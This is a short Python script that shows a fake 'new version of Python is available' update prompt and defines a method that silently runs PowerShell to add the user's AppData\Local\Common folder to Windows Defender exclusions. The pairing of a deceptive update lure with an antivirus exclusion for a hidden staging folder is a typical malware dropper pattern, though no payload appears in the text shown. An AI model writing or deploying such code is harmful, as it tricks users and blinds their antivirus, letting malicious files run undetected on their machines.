import os
import pathlib as pl

class Main:
    def __init__(self):
        pass
    
    def send_update_notification(self):
        install_input = input("""A new version of Python is available: 3.12.2
                            You are currently using: 3.11.6
                            Press 'Y' or 'Enter' to update or 'N' to skip: """)
        return install_input.strip().lower() in ['y', '']

    def add_folder_to_windows_defender_exclusions(self, folder_path):
        folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
        os.system(command)